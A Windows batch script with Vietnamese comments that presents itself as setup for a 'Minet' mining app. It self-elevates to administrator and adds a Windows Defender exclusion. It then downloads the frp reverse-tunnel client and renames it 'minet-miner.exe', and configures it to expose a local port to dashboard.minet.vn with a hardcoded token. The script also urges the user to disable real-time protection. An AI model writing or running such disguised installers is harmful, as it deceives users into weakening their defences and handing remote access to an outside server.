@echo off
setlocal enabledelayedexpansion

:: 1. Chạy với quyền Admin (Bắt buộc để thêm ngoại lệ cho Defender)
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

:: 2. Thiết lập thư mục làm việc cố định
set "WORK_DIR=C:\MinetMining"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
cd /d "%WORK_DIR%"

echo ========================================
echo    MINET SETUP - NATIVE WINDOWS FIX
echo ========================================

:: 3. Thêm thư mục này vào danh sách loại trừ của Windows Defender (Chống văng)
echo [INFO] Dang thiet lap quyen uu tien...
powershell -Command "Add-MpPreference -ExclusionPath '%WORK_DIR%'" >nul 2>&1

:: 4. Nhập Email
set /p EM="Email cua ban: "
if "!EM!"=="" (echo Email ko duoc trong! & pause & exit /b)

:: 5. Tải và giải nén bằng PowerShell thuần
echo [INFO] Dang tai tunnel client...
powershell -Command "^
    $url = 'https://github.com/fatedier/frp/releases/download/v0.51.3/frp_0.51.3_windows_amd64.zip'; ^
    $zipFile = 'client.zip'; ^
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
    Invoke-WebRequest -Uri $url -OutFile $zipFile; ^
    Expand-Archive -Path $zipFile -DestinationPath '.' -Force; ^
    $exe = Get-ChildItem -Recurse -Filter 'frpc.exe' | Select-Object -First 1; ^
    Copy-Item $exe.FullName -Destination '.\minet-miner.exe' -Force; ^
    Remove-Item $zipFile; ^
    Remove-Item (Get-ChildItem -Directory -Filter 'frp_*').FullName -Recurse -Force; ^
"

:: 6. Tạo file cấu hình
echo [common]> config.ini
echo server_addr = dashboard.minet.vn>> config.ini
echo server_port = 7000>> config.ini
echo token = minet2024>> config.ini
echo.>> config.ini
echo [mine-!EM!]>> config.ini
echo type = tcp>> config.ini
echo local_ip = 127.0.0.1>> config.ini
echo local_port = 3333>> config.ini
echo remote_port = 0>> config.ini

echo ----------------------------------------
echo [DONE] Da thiet lap xong tai %WORK_DIR%
echo [TIPS] Neu app van vang, hay tat han 'Real-time Protection' trong Windows Security.
echo ----------------------------------------
echo Dang khoi chay miner...
timeout /t 3
start minet-miner.exe -c config.ini
pause
